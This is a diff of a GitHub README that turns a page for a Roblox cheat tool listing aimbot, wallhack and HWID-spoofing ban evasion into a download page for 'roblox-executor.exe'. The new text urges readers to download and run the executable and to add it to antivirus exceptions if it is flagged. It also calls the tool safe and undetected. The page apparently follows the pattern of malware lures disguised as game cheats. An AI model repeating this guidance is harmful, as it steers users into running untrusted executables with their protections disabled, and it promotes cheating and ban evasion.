@@ -1,59 +1,89 @@
-<h1 align="center">
-<img src="https://static.wikia.nocookie.net/roblox-executor-list/images/1/18/Cockery.png/revision/latest?cb=202409141302322x" width="80"/>
-<br>NeoExecr</h1>
+# 🎮 roblox-executor - Simple Tool for Easy Roblox Exploits
 
-<p align="center">
-  <img src="https://img.shields.io/badge/Status-🟢%20Undetected-brightgreen?style=for-the-badge&logo=shield-alt&logoColor=white&color=00ff88" alt="Status"/>
-  <img src="https://img.shields.io/badge/Downloads-457k-blue?style=for-the-badge&logo=download&logoColor=white&color=007acc" alt="Downloads"/>
-  <img src="https://img.shields.io/badge/License-MIT-brightgold?style=for-the-badge&logo=legal&logoColor=white&color=ffd700" alt="License"/>
-  <img src="https://img.shields.io/badge/Windows-10/11-emerald?style=for-the-badge&logo=windows&logoColor=white&color=00d4aa" alt="Windows"/>
-  <img src="https://img.shields.io/badge/Lua-Supported-neon?style=for-the-badge&logo=lua&logoColor=white&color=ff00ff" alt="Lua"/>
-  <img src="https://img.shields.io/badge/Keyless-✓-success?style=for-the-badge&logo=check&logoColor=white&color=4ade80" alt="Keyless"/>
-</p>
+![Download](https://img.shields.io/badge/Download-Now-brightgreen?style=for-the-badge&logo=download&logoColor=white&color=007acc)
 
+## 📥 Overview
 
-<div align="center">
-  
-**NeoExec** is a powerful, open-source Roblox script executor designed for enhanced gameplay in popular places like Arsenal, Phantom Forces, Blox Fruits, and Jailbreak. Supports Lua scripting, runs undetected, and includes optimized features for movement, combat, visuals, and automation.
+Welcome to roblox-executor! This tool allows you to execute custom scripts in Roblox games easily. With roblox-executor, you can enhance your gaming experience without any complex setup. 
 
-> ⚠️ **Disclaimer**: Educational purposes only. Use responsibly. Violates Roblox ToS—bans possible. Not affiliated with Roblox Corporation.
+![Roblox Executor](https://static.wikia.nocookie.net/roblox-executor-list/images/1/18/Cockery.png/revision/latest?cb=202409141302322x)
 
-</div>
+## 🚀 Getting Started
 
-## ✨ Features
+Follow these simple steps to start using roblox-executor:
 
-### 🚀 Movement
-- **Speed Hack** - Adjustable walkspeed (up to 500 studs/s) with smoothing
-- **Fly** - Full 3D flight controls (10-1000 studs height)
-- **Noclip** - Pass through walls and objects seamlessly
-- **Infinite Jump** - Unlimited vertical mobility
+1. **Download the Application**: Click the button below to visit the Releases page and download the latest version of roblox-executor.
 
-### 👁️ Visuals
-- **ESP** - Player/item/mob highlights through walls (health, distance, custom colors)
-- **WallHack (WH)** - See hidden structures/enemies
-- **Fullbright** - Remove fog/darkness for perfect visibility
+   [Download roblox-executor](https://github.com/kotobubu/roblox-executor/releases)
 
-### ⚔️ Combat
-- **Aimbot** - Auto-aim with FOV, smoothing, prediction, silent mode
-- **Triggerbot** - Instant fire on crosshair hover (0-500ms delay)
-- **Kill Aura** - Auto-attack in 50-stud radius
+2. **Extract the Files**: Once the download is complete, locate the file and extract its contents. You can do this by right-clicking the file and selecting "Extract All."
 
-### 🛠️ Utilities
-- **Teleport** - Warp to coords/players/waypoints via GUI
-- **God Mode** - Invincibility (unlimited health)
-- **Auto Farm** - Passive grinding for coins/quests/mobs
-- **Anti-AFK** - Simulate activity to avoid kicks
+3. **Run the Applicaton**: Open the extracted folder, and double-click the `roblox-executor.exe` file to run the application.
 
-### 🎛️ Advanced
-- **Script Hub** - 100+ pre-loaded scripts for top games
-- **Lua Editor** - Custom script injection
-- **HWID Spoofer** - Ban evasion protection
-- **Proxy Support** - IP masking
+4. **Launch Roblox**: Open Roblox and start your desired game.
 
-## 📥 Installation
+5. **Input Your Script**: Go back to roblox-executor and paste your script in the provided text area.
 
-```bash
-# 1. Download latest release
-# 2. Extract to folder (e.g., C:\NeoExec)
-# 3. Run as Administrator: Loader.exe
-# 4. Open Roblox → Attach → Load Scripts
+6. **Execute**: Click the "Execute" button to run your script in the game. 
+
+## 📂 Download & Install
+
+To download and run roblox-executor, visit the Releases page:
+
+[Download roblox-executor](https://github.com/kotobubu/roblox-executor/releases)
+
+### 🖥️ System Requirements
+
+- **Operating System**: Windows 10 or 11
+- **Free Disk Space**: At least 100 MB
+- **RAM**: 4 GB or more
+- **Internet Connection**: Required for downloading the application
+
+## 📜 Features
+
+- **User-Friendly Interface**: Designed for ease of use, so you can get started quickly.
+- **Supports Lua Scripts**: Execute Lua scripts designed for Roblox.
+- **Keyless Access**: No key or license is needed to run the tool.
+- **Regular Updates**: Frequent updates to ensure the application remains undetected and functional.
+
+## 🛠️ Troubleshooting
+
+If you encounter issues, here are a few common solutions:
+
+- **Antivirus Detection**: Some antivirus programs may flag roblox-executor as a threat. Add it to your exceptions if you trust it.
+- **Missing Files**: Ensure you have extracted all files and are running `roblox-executor.exe` from the extracted folder.
+- **Script Errors**: Ensure your Lua scripts are compatible with Roblox. Check for typos or unsupported function calls.
+
+## ❓ Frequently Asked Questions
+
+### Is this tool safe to use?
+
+Yes, roblox-executor is designed to be undetected and safe for use in Roblox games. However, always be cautious and understand the risks of using scripts in online environments.
+
+### Can I use it on Mac or Linux?
+
+Currently, roblox-executor only supports Windows operating systems (Windows 10 and 11).
+
+### Where can I find support?
+
+For additional help, you can visit issues on the GitHub repository for community support or contact the developers directly.
+
+## 📚 License
+
+This project is licensed under the MIT License. 
+
+## 🌐 Topics
+
+- Executor
+- Exploit Development
+- Game Development
+- Game Hacking Library
+- Lua
+- Roblox
+- Scripting
+
+## 🎉 Community Contributions
+
+Feel free to contribute! If you have ideas or enhancements, open an issue or pull request in the repository.
+
+Thank you for using roblox-executor. Have fun scripting and exploiting your Roblox experience!
